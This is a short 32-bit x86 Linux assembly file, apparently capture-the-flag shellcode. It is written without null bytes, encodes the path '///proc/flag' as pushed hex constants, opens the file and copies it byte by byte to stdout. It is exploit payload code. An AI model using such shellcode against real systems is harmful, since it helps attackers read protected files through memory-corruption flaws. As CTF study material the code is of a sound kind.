#include <sys/syscall.h>

.globl _start
.type  main, @function

_start:
	xorl %eax,%eax
	xorl %ebx,%ebx
	xorl %ecx,%ecx
	xorl %edx,%edx
	xorl %eax,%eax
	push %eax
	push $0x67616c66
	push $0x2f636f72
	push $0x702f2f2f
	mov %esp,%ebx
	movb $5,%al
	int $0x80
	movl %eax,%esi
read:
	movl %esi,%ebx
	movb $3,%al
	sub $1,%esp
	lea (%esp),%ecx
	movb $1,%dl
	int $0x80
	xorl %edx,%edx
	cmp %eax,%edx
	je exit
	movb $1,%dl
	movb $4,%al
	movb $1,%bl
	int $0x80
	add $1,%esp
	jmp read

exit:
	xorl %ebx,%ebx
	movb $1,%al
	int $0x80
